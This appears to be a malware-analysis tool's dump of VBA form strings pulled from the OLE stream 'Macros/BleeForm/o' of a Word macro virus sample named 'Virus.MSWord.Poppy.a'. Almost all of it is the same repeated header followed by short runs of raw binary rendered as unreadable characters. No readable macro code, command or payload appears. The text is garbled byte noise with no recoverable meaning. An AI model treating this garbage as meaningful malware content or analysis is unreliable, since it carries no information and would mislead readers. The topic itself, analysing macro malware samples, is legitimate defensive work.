- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���VL"��ֺ�B˒���_q�{u��~�Ag�۞���u���%�H�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yU1X�)'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����DQ�UA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�$@�Y�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����LM2��x�Q32
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ֆ�kϢ�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<1[�<h*H�m�]}�<�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zʂ�,p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1�͛o�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��Y/׺�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ȡi��+1R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gmۛ�v�>���f��_o&�,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�h�b3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�f���6p�Ԛ��p�8�Ͷ�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~H�?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&ə�<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)���K����whZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y.�ք�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?)"Lc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6F2˺wr���u6��\^��*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���˖d��O ;ԫ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/8��-=��zb9h.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
��v��Fq�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V��)��z:M=TĔ�+m����R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^-3a�s8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!������t�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8[K�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c6�;o�ЌB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}���=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*O=W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t.�ZtX��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������X�/J����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r6��^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ɍ�Ͽ����,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tߍ�	���]����`��A�.6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E"�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�H�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K戋l�u$}pA�_i�-

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��_��1G����f�f���%�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��l;�X0!��&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{&��hmC,u]��*�sr�ST�;0Vf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m©���WG���3�G�.���v
Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��E{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*I��{mZ1�����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.k$qW�&���u�Z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k0�� �ےDs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�G��]��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A��]� �t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���D}����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�ru���w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-RB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}��CnSS���lP�R:��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zp�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z/Zֲ;f��;�6�W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EDM�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��i��-1�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ަ��n�6�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[ȁ�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʝ]���+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ģD�ؓ����җG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�25�]�[O�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�����H���3>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u|�����G�S��5��D�5=O���[��-�i�+�.�՝c���,�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���9b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��sw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ں�N�=�j[=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PI}�Jp��B��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ʭ�$�_fh|<xV��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�k���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:��L� �,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�''=B�͆,wc㓮��k�m��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Rv��E/��)4��cVi�;1��6��_��L��TR�h�b�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
݇ӋtT��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����K�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����F�i�^���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��TO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ii���%����G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ޟ�7��r��_�WUXt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�GX��(�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Xӈ�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;��Z,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ry�#?O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ߨ'��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c��ѷ�+ܝQe���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӫc��NEx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��A$�
(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�!! bQ^B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.pX�c;X��w�yj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}٢�����I����*��婎I��o2��$��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�!�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q-��|Օ�2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c-]l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L��@�Nсª�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[��&3�R�����l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�e��Y�$t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�X^�ٯ�[a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1���G�=N�~�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�J���Ӱ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#;q�lt���H���}8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W$iO�8#��z}����Y$Q��Q�NC!�iǯ��������Har��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|u	�/[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2y�D��
)ح/*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�gPԼ��ƥ��`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�ϧ�YI�V~�x�ԝՕ��N��4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Xe^�R
��p�aiBP�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�����o��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9X�d,C0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'��ٞ��v�4zN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�q���;�W���j�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2yyU*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`'n�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�����Y��|H�`~٧��T��j�4��p�J��bF��G��玭/᫫_���jYa�H���.�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*M1��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�REU�v��oV+�J��^��Z���m(j���5�M%H]ƚ�T����dK#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǿVv��g�4ZNܢ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��۫�F��B�^#EQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
